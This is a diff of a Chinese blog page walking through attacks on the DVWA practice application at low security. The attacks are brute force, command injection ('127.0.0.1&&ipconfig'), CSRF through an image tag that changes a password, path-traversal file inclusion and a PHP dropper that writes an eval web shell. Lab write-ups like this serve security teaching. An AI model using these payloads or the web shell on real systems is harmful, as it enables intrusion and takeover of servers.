@@ -132,7 +132,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      16
+      15
        分钟
     </span>
   
@@ -163,33 +163,16 @@
           <div class="post-content mx-auto" id="post">
             
             <article class="markdown-body">
-              <h5 id="brute-force"><a href="#brute-force" class="headerlink" title="brute-force:"></a>brute-force:</h5><p>就是对进行字典比对。<br><img src="/2020/05/30/DVWA-low/2.png" srcset="/img/loading.gif" alt="Alt text"></p>
-<hr>
-![Alt text](./3.png)
-<hr>
-![Alt text](./1.png)
-<hr>
-![Alt text](./4.png)
-<hr>
-![Alt text](./5.png)
-![Alt text](./6.png)
-#####  Command Execution:
-因为没有对用户输入进行处理，一些命令中特殊的执行字符执行多个语句，从而实现添加用户等等。
-能够通过
+              <h5 id="brute-force"><a href="#brute-force" class="headerlink" title="brute-force:"></a>brute-force:</h5><p>就是对进行字典比对。<br><img src="/2020/05/30/DVWA-low/1-2.png" srcset="/img/loading.gif" alt="Alt text"></p>
+<p><img src="/2020/05/30/DVWA-low/3.png" srcset="/img/loading.gif" alt="Alt text"></p>
+<p><img src="/2020/05/30/DVWA-low/1-1.png" srcset="/img/loading.gif" alt="Alt text"><br><img src="/2020/05/30/DVWA-low/4.png" srcset="/img/loading.gif" alt="Alt text"><br><img src="/2020/05/30/DVWA-low/5.png" srcset="/img/loading.gif" alt="Alt text"><br><img src="/2020/05/30/DVWA-low/6.png" srcset="/img/loading.gif" alt="Alt text"></p>
+<h5 id="Command-Execution"><a href="#Command-Execution" class="headerlink" title="Command Execution:"></a>Command Execution:</h5><p>因为没有对用户输入进行处理，一些命令中特殊的执行字符执行多个语句，从而实现添加用户等等。<br>能够通过</p>
 <pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp;&amp;ipconfig</code></pre>
-显示的就是相关ip网关等等![Alt text](./2-1.png)
-但是电脑自己禁止了net user  /add这些，可以通过虚拟机重新搭建环境实现。
-##### csrf：
-跨站请求伪造攻击，在用户没有无意识的情况盗用用户身份进行攻击。
-进行抓包能够看到请求链接为``/DVWA-master/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change HTTP/1.1``
-- 检测漏洞：没有token，去掉referer能够正常执行。
-- 利用：
-![Alt text](./csrf-1.png)
-
-<p>在自己的网站设置一个img的src为<code>http://192.168.139.227/DVWA-master/vulnerabilities/csrf/</code><br><img src="/2020/05/30/DVWA-low/csrf-3.png" srcset="/img/loading.gif" alt="Alt text"></p>
-<p>模拟用户进行网站的点击<br><img src="/2020/05/30/DVWA-low/csrf-2.png" srcset="/img/loading.gif" alt="Alt text"><br>退出dvwa重新登录可以看到，密码已经被修改。</p>
-<h5 id="file-including："><a href="#file-including：" class="headerlink" title="file including："></a>file including：</h5><p>服务器·执行php文件时，可以通过include等函数实现另一个代码的执行。</p>
+<p>显示的就是相关ip网关等等<img src="/2020/05/30/DVWA-low/2-1.png" srcset="/img/loading.gif" alt="Alt text"><br>但是电脑自己禁止了net user  /add这些，可以通过虚拟机重新搭建环境实现。</p>
+<h5 id="csrf："><a href="#csrf：" class="headerlink" title="csrf："></a>csrf：</h5><p>跨站请求伪造攻击，在用户没有无意识的情况盗用用户身份进行攻击。<br>进行抓包能够看到请求链接为<code>/DVWA-master/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change HTTP/1.1</code></p>
 <ul>
+<li>检测漏洞：没有token，去掉referer能够正常执行。</li>
+<li>利用：<br>在自己的网站设置一个img的src为<code>http://192.168.138.226/DVWA-master/vulnerabilities/csrf/</code>，就是修改密码的url<br>模拟用户进行网站的点击，退出dvwa重新登录可以看到，密码已经被修改。<h5 id="file-including："><a href="#file-including：" class="headerlink" title="file including："></a>file including：</h5>服务器·执行php文件时，可以通过include等函数实现另一个代码的执行。</li>
 <li>本地文件包含：<br>在dvwa下的phpinfo(知道文件路径)<br>(该路径能够执行php等文件)<pre><code class="hljs awk"><span class="hljs-regexp">/DVWA-master/</span>vulnerabilities<span class="hljs-regexp">/fi/</span>?page=..<span class="hljs-regexp">/../</span>phpinfo.php</code></pre>
 <img src="/2020/05/30/DVWA-low/wen-1.png" srcset="/img/loading.gif" alt="Alt text"><br><img src="/2020/05/30/DVWA-low/wen-2.png" srcset="/img/loading.gif" alt="Alt text"><br>搭配文件上传食用</li>
 <li>远程文件包含<br>在网站放一个木马<pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?PHP</span> fputs(fopen(<span class="hljs-string">'shell.php'</span>,<span class="hljs-string">'w'</span>),<span class="hljs-string">'&lt;?php @eval($_POST[\'cmd\']);?&gt;'</span>);<span class="hljs-meta">?&gt;</span></span></code></pre>
